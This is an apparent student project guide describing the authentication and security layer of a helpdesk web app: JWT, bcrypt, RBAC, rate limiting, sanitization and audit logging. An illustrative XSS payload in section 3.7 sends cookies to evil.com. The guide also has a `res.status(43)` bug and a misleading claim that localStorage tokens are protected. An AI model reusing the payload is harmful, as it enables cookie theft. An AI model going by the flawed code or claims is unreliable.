# Role: Authentication, Authorization & Security

---

## 1. Role Responsibility

As the **Security Engineer**, this role is the guardian of the system. Responsibilities include:

1. **Only legitimate users can log in**: Verifying identity through secure authentication.
2. **Users can only do what they're permitted to**: Enforcing Role-Based Access Control (RBAC).
3. **The system resists attacks**: Protecting against brute force, XSS, and other common vulnerabilities.
4. **Sensitive data is protected**: Passwords are hashed, tokens are secure, logs are sanitized.

> **Think of this role as the bouncer and the security camera.** It checks IDs at the door (authentication), verifies VIP access (authorization), and watches for troublemakers (security monitoring).

---

## 2. Where This Role Fits in the Overall Architecture

This code runs **before** most other backend code—as middleware:

```
HTTP Request arrives
         │
         ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│       SECURITY DOMAIN                                                        │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │ 1. Helmet          → Set secure HTTP headers                          │  │
│  │ 2. CORS            → Block unauthorized origins                       │  │
│  │ 3. Rate Limiter    → Block too many requests                          │  │
│  │ 4. Body Parser     → Parse JSON (limited size to prevent DoS)         │  │
│  │ 5. Sanitizer       → Strip malicious scripts from input               │  │
│  │ 6. authMiddleware  → Verify JWT token, attach req.user                │  │
│  │ 7. requirePermission → Check if user has specific permission          │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────┬──────────────────────────────────────────┘
                                   │ (only if all checks pass)
                                   ▼
                          Route Handler (Backend Engineer)
                                   │
                                   ▼
                          Database (Database Engineer)
```

### This role owns:
- `backend/src/middleware/auth.js` — JWT verification and RBAC
- `backend/src/middleware/rateLimiter.js` — Request rate limiting
- `backend/src/utils/sanitizer.js` — XSS prevention
- `backend/src/utils/auditLogger.js` — Security event logging
- `backend/src/routes/api/auth.js` — Login/Register endpoints

### Protects:
- Every other team member's code runs **after** these security checks

---

## 3. Detailed Explanation of What Was Built

### 3.1 Authentication: How Login Works

**The Problem**: How do we know who is making a request?

**The Solution**: JSON Web Tokens (JWT)

**Step-by-step login flow:**

```
User enters email + password on frontend
         │
         ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ POST /api/auth/login                                                        │
│                                                                              │
│ 1. Rate limiter checks: Has this IP made 5 requests in last 15 min?        │
│    - If yes: Return 429 Too Many Requests                                   │
│    - If no: Continue                                                        │
│                                                                              │
│ 2. Validate input: Is email and password provided?                          │
│    - If missing: Return 400 Bad Request                                     │
│                                                                              │
│ 3. Find user in database by email                                           │
│    - If not found: Return 401 Invalid credentials                           │
│                                                                              │
│ 4. Compare password with stored hash using bcrypt                           │
│    - If no match: Return 401 Invalid credentials                            │
│    - Log: LOGIN_FAILED event                                                │
│                                                                              │
│ 5. Check if account is active                                               │
│    - If deactivated: Return 403 Account inactive                            │
│                                                                              │
│ 6. Generate JWT tokens:                                                      │
│    - Access Token (1 hour): { userId, email, role }                         │
│    - Refresh Token (7 days): { userId }                                     │
│                                                                              │
│ 7. Update lastLogin in database                                             │
│                                                                              │
│ 8. Log: LOGIN_SUCCESS event                                                 │
│                                                                              │
│ 9. Return: { token, refreshToken, user }                                    │
└─────────────────────────────────────────────────────────────────────────────┘
```

**The actual code (simplified):**

```javascript
// routes/api/auth.js

router.post('/login', authLimiter, asyncHandler(async (req, res) => {
  const { email, password } = req.body;

  // Find user
  const user = await prisma.user.findUnique({
    where: { email },
    include: { role: true }
  });

  if (!user) {
    auditLogger.logEvent('LOGIN_FAILED', { ip: req.ip, email });
    return res.status(401).json({ message: 'Invalid credentials' });
  }

  // Check password
  const validPassword = await bcrypt.compare(password, user.passwordHash);
  if (!validPassword) {
    auditLogger.logEvent('LOGIN_FAILED', { ip: req.ip, userId: user.id });
    return res.status(401).json({ message: 'Invalid credentials' });
  }

  // Generate tokens
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email, role: user.role.name },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }
  );

  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' }
  );

  // Log success
  auditLogger.logEvent('LOGIN_SUCCESS', { userId: user.id, ip: req.ip });

  res.json({ token: accessToken, refreshToken, user: sanitizeUser(user) });
}));
```

---

### 3.2 Password Security with Bcrypt

**The Problem**: We can't store passwords in plain text. If database is breached, all passwords would be exposed.

**The Solution**: One-way hashing with bcrypt

**How it works:**

```javascript
// When user registers:
const password = 'userPassword123';
const saltRounds = 10;  // How many times to process (more = slower but safer)
const passwordHash = await bcrypt.hash(password, saltRounds);
// Result: $2b$10$N9qo8uLOickgx2ZMRZoMy.MrYV8Jzq8Y8T8Yr8xg8vE8G8U8K8O8q

// When user logs in:
const isMatch = await bcrypt.compare('userPassword123', passwordHash);
// Returns: true or false
```

**Key points:**
- Same password → different hash every time (because of random salt)
- No way to reverse the hash back to the password
- Comparison is slow on purpose (to prevent brute force)

---

### 3.3 JWT Token Structure

**What's inside a JWT token?**

A JWT has three parts separated by dots:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiQURNSU4ifQ.signature
│                                      │                                        │
└─────── Header ───────────────────────┴──────── Payload ───────────────────────┴─ Signature
```

**Header** (algorithm info):
```json
{ "alg": "HS256", "typ": "JWT" }
```

**Payload** (our data):
```json
{ "userId": "123", "email": "user@example.com", "role": "ADMIN", "iat": 1234567890, "exp": 1234571490 }
```

**Signature** (tamper detection):
```
HMACSHA256(header + "." + payload, JWT_SECRET)
```

**Why this works:**
- Payload is readable (Base64 encoded, not encrypted)
- But if anyone changes the payload, the signature won't match
- Without knowing JWT_SECRET, you can't create a valid signature

---

### 3.4 Token Verification (authMiddleware)

Every protected route uses `authMiddleware`:

```javascript
// middleware/auth.js

const authMiddleware = async (req, res, next) => {
  // Step 1: Extract token from header or cookie
  const token = extractToken(req);
  
  if (!token) {
    return res.status(401).json({ message: 'Authentication required' });
  }

  try {
    // Step 2: Verify the token
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    
    // Step 3: Get user from database (to ensure they still exist and are active)
    const user = await prisma.user.findUnique({
      where: { id: decoded.userId },
      include: { role: true, department: true }
    });

    if (!user || !user.isActive) {
      return res.status(401).json({ message: 'User not found or inactive' });
    }

    // Step 4: Attach user to request object
    req.user = {
      id: user.id,
      email: user.email,
      role: user.role.name,
      departmentId: user.departmentId,
      permissions: user.role.permissions  // Array of permission strings
    };

    next();  // Continue to route handler
  } catch (error) {
    return res.status(401).json({ message: 'Invalid or expired token' });
  }
};
```

**After this middleware runs, every subsequent middleware and route handler can access `req.user`.**

---

### 3.5 Authorization: Role-Based Access Control (RBAC)

**The Problem**: Even if a user is logged in, they shouldn't be able to do everything.

**The Solution**: Permission-based checks

**Permission structure:**

```
resource:action
```

Examples:
- `tickets:create` — Can create tickets
- `tickets:delete` — Can delete tickets
- `users:read` — Can view user list
- `reports:read` — Can access reports

**Role permissions (from the database):**

| Role | Permissions |
|------|-------------|
| SUPER_ADMIN | `['*']` (wildcard = everything) |
| ADMIN | `['users:*', 'tickets:*', 'departments:*', 'reports:*']` |
| MANAGER | `['tickets:read:department', 'tickets:update:department', 'reports:read']` |
| AGENT | `['tickets:read:assigned', 'tickets:update:assigned', 'tickets:comment:assigned']` |
| CUSTOMER | `['tickets:create', 'tickets:read:own', 'tickets:comment:own']` |

**The requirePermission middleware:**

```javascript
// middleware/auth.js

const requirePermission = (permission) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ message: 'Not authenticated' });
    }

    const hasAccess = hasPermission(req.user.permissions, permission);
    
    if (!hasAccess) {
      auditLogger.logEvent('PERMISSION_DENIED', {
        userId: req.user.id,
        permission,
        ip: req.ip
      });
      return res.status(43).json({ message: 'Insufficient permissions' });
    }

    next();
  };
};

// Helper function with wildcard support
function hasPermission(userPermissions = [], requiredPermission) {
  // Full wildcard
  if (userPermissions.includes('*')) return true;
  
  // Exact match
  if (userPermissions.includes(requiredPermission)) return true;
  
  // Resource wildcard (e.g., user has 'tickets:*', checking 'tickets:create')
  const [resource] = requiredPermission.split(':');
  if (userPermissions.includes(`${resource}:*`)) return true;
  
  return false;
}
```

**How it's used in routes:**

```javascript
// Only users with 'tickets:delete' permission can delete
router.delete('/:id', authMiddleware, requirePermission('tickets:delete'), ...);

// Only users with 'users:create' permission can create users
router.post('/', authMiddleware, requirePermission('users:create'), ...);
```

---

### 3.6 Rate Limiting

**The Problem**: Attackers can flood the system with requests (DoS) or try thousands of passwords (brute force).

**The Solution**: Limit how many requests an IP can make

**Three rate limiters:**

```javascript
// middleware/rateLimiter.js

// General API: 100 requests per 15 minutes
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,
  message: { success: false, message: 'Too many requests, please try again later' }
});

// Authentication: 5 requests per 15 minutes (very strict!)
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { success: false, message: 'Too many login attempts, please try again later' }
});

// File uploads: 20 per hour
const uploadLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,  // 1 hour
  max: 20,
  message: { success: false, message: 'Upload limit reached, please try again later' }
});
```

**Why 5 for auth?**
- A legitimate user won't fail login 5 times in 15 minutes
- An attacker trying to guess passwords will hit this limit quickly
- Slows down brute force attacks dramatically

---

### 3.7 Input Sanitization (XSS Prevention)

**The Problem**: Users can submit malicious JavaScript in text fields:
```html
<script>document.location='http://evil.com/?cookie='+document.cookie</script>
```

If we display this without cleaning it, the script runs in other users' browsers!

**The Solution**: Strip dangerous HTML before storing

```javascript
// utils/sanitizer.js

const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

const sanitize = (content) => {
  if (typeof content !== 'string') return content;
  return DOMPurify.sanitize(content);
};

// Middleware to sanitize specific fields
const sanitizeMiddleware = (fields = []) => {
  return (req, res, next) => {
    if (req.body) {
      fields.forEach(field => {
        if (req.body[field]) {
          req.body[field] = sanitize(req.body[field]);
        }
      });
    }
    next();
  };
};
```

**Usage:**

```javascript
// In tickets route
router.post('/',
  authMiddleware,
  sanitizeMiddleware(['title', 'description']),  // Clean these fields
  asyncHandler(async (req, res) => {
    // req.body.title and req.body.description are now safe
  })
);
```

**Before and after:**
```
Input:  <script>alert('xss')</script>Hello World
Output: Hello World
```

---

### 3.8 Security Headers (Helmet)

**The Problem**: Browsers have security features, but they need to be enabled via HTTP headers.

**The Solution**: Helmet middleware sets secure headers automatically

```javascript
// In index.js
app.use(helmet());
```

**Headers it sets:**

| Header | Purpose |
|--------|---------|
| `X-Content-Type-Options: nosniff` | Prevents MIME type sniffing attacks |
| `X-Frame-Options: SAMEORIGIN` | Prevents clickjacking (embedding in iframes) |
| `X-XSS-Protection: 1; mode=block` | Enables browser's XSS filter |
| `Strict-Transport-Security` | Forces HTTPS |

---

### 3.9 Audit Logging

**The Problem**: If something goes wrong, we need to know what happened.

**The Solution**: Log security-relevant events

```javascript
// utils/auditLogger.js

const EVENTS = {
  LOGIN_SUCCESS: 'LOGIN_SUCCESS',
  LOGIN_FAILED: 'LOGIN_FAILED',
  LOGOUT: 'LOGOUT',
  PERMISSION_DENIED: 'PERMISSION_DENIED',
  USER_CREATED: 'USER_CREATED',
  TICKET_DELETED: 'TICKET_DELETED',
  SENSITIVE_ACCESS: 'SENSITIVE_ACCESS'
};

const logEvent = (eventType, details) => {
  const logEntry = {
    timestamp: new Date().toISOString(),
    event: eventType,
    ...details
  };
  
  // Remove sensitive data before logging
  delete logEntry.password;
  delete logEntry.token;
  
  console.log(JSON.stringify(logEntry));
};
```

**Example log output:**
```json
{"timestamp":"2026-01-22T12:00:00.000Z","event":"LOGIN_FAILED","ip":"192.168.1.100","email":"hacker@evil.com"}
{"timestamp":"2026-01-22T12:00:05.000Z","event":"PERMISSION_DENIED","userId":"123","permission":"users:delete","ip":"192.168.1.100"}
```

---

## 4. Interaction With Other Parts

### 4.1 Connection to Frontend

This role **defines** how authentication works:
- Token format and where to store it
- How to attach token to requests
- What happens on 401/403 errors

The Frontend Engineer implements this in the Axios interceptor.

---

### 4.2 Connection to Backend

This role **provides** middleware that the Backend Engineer uses:

```javascript
// Backend Engineer writes:
router.post('/', authMiddleware, requirePermission('tickets:create'), ...)

// Only this role writes authMiddleware and requirePermission
// Security code runs BEFORE endpoint code
```

---

### 4.3 Connection to Database

This role **uses** the schema for:
- Looking up users by email during login
- Fetching role permissions
- Storing refresh tokens

---

## 5. Why These Decisions Were Made

### 5.1 JWT (Not Sessions)

**Decision**: Stateless JWT tokens

**Why**:
- No session storage needed on server
- Works across multiple backend servers
- Frontend can read role from token

**Tradeoff**:
- Can't instantly revoke tokens (they expire naturally)
- Token contains user info (slightly larger requests)

---

### 5.2 Short Access Token + Long Refresh Token

**Decision**: 1 hour access, 7 day refresh

**Why**:
- Limits damage if access token is stolen (only works for 1 hour)
- Users don't have to re-login constantly (refresh token lasts a week)

---

### 5.3 Bcrypt with 10 Rounds

**Decision**: 10 salt rounds

**Why**:
- Industry standard balance between security and performance
- 10 rounds ≈ 100ms per hash (slow enough to prevent brute force)

---

## 6. Common Questions & Safe Answers

### Q1: "How is the password stored?"

**Safe Answer**:
> "Passwords are never stored in plain text. When a user registers, we use bcrypt with 10 salt rounds to create a one-way hash. This hash cannot be reversed back to the password. During login, we hash the attempt and compare hashes—never the actual passwords."

---

### Q2: "What stops someone from stealing a token?"

**Safe Answer**:
> "We use short-lived access tokens that expire in 1 hour. Even if stolen, the window of abuse is limited. The token is stored in localStorage (not accessible by JavaScript from other domains due to browser security). For higher security, we could use httpOnly cookies, which we've prepared for but is optional in the current setup."

---

### Q3: "How does RBAC work?"

**Safe Answer**:
> "Each role has an array of permission strings stored in the database. When a protected route is called, our middleware checks if the user's permissions array includes the required permission. We support wildcards—so an ADMIN with 'tickets:*' passes any tickets-related permission check."

---

### Q4: "What attacks does the system defend against?"

**Safe Answer**:
> "We protect against brute force via rate limiting (5 login attempts per 15 minutes), XSS via DOMPurify sanitization of user input, clickjacking via X-Frame-Options header, and various other web attacks via Helmet's security headers. We also implement CORS to restrict which domains can call our API."

---

### Q5: "Why log security events?"

**Safe Answer**:
> "Audit logs create an evidence trail for security investigations. If we detect unusual activity—like many failed logins from one IP—we can investigate. Logs are structured JSON and exclude sensitive data like passwords and tokens."

---

## 7. Rebuild Process (Step-by-Step)

### Step 1: Set Up Dependencies

```bash
npm install jsonwebtoken bcryptjs express-rate-limit helmet cors dompurify jsdom
```

### Step 2: Create Auth Route

Build `/api/auth/login` and `/api/auth/register` first. These don't need other middleware.

### Step 3: Create authMiddleware

Write the JWT verification middleware. Test it by protecting a simple endpoint.

### Step 4: Add Rate Limiting

Create the rate limiters. Apply `authLimiter` to login/register routes.

### Step 5: Create RBAC

1. Define role permissions in seed data
2. Write `requirePermission` middleware
3. Apply to routes that need specific permissions

### Step 6: Add Sanitization

Create sanitizer middleware. Apply to routes that accept user content (tickets, comments).

### Step 7: Add Audit Logging

Create logger utility. Add log calls to security-relevant events.

### Step 8: Apply Helmet

Add `app.use(helmet())` to index.js.

---

## Final Notes for Presentation

### Demonstrable Features:

1. **Failed login rate limiting**: Try logging in with wrong password 6 times
2. **XSS prevention**: Show that `<script>` tags are stripped
3. **Permission denied**: Login as CUSTOMER, try to access admin API
4. **Token structure**: Decode a JWT and show its contents

### Opening statement:

> "I was responsible for security in HelpDesk Pro. This includes authentication using JWT tokens with bcrypt password hashing, role-based access control with a flexible permission system, and multiple defense layers including rate limiting, input sanitization, and security headers."

### Closing statement:

> "The security implementation follows industry best practices as appropriate for a web application of this type. While we've made architectural tradeoffs—like using localStorage instead of httpOnly cookies—these are documented decisions that balance security with development simplicity for this project scope."

---

**Remember: This role is the last line of defense. If security fails, everything fails.**
